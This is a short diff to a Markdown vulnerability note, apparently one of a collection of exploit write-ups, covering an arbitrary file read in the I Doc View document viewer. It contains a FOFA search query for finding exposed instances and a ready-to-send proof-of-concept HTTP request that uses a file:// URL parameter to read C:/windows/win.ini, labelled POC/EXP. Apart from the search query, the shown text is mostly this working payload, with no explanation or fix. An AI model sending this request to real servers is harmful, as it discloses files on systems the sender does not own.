@@ -86,6 +86,7 @@ FOFA：title="I Doc View"
 
 POC/EXP：
 
+```http
 GET /view/url?url=file:///C:/windows/win.ini HTTP/1.1
 Host: 127.0.0.1:28080
 Cache-Control: max-age=0
@@ -98,6 +99,7 @@ Accept-Language: zh-CN,zh;q=0.9
 Cookie: JSESSIONIDocv=DAC1F92E30B9BECB756134EB26FAA9E7
 Connection: close
 
+```
 ![image-20231214112823347](./.resource/iDocview任意文件读取/media/image-20231214112823347.png)
 
 
